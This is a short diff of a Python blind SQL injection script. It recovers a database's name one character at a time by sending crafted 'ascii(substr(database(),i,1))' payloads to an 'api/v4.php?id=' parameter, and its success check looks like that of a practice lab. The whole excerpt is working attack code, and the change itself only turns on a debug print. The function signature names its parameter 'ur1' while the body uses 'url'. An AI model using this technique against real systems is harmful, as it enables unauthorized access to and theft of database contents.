@@ -37,7 +37,7 @@ def getDbName(ur1, dbNameLen):
             payload = "api/v4.php?id=1'+and+ascii(substr(database()," + str(i) + ",1))=" + str(j) + "--+"
 
             fullUrl = url + payload
-            # print ( ful1Ur1)
+            print (fullUrl)
             res = requests.get(fullUrl)
             if "You are in" in res.text:
                 dbName = dbName + chr(j)
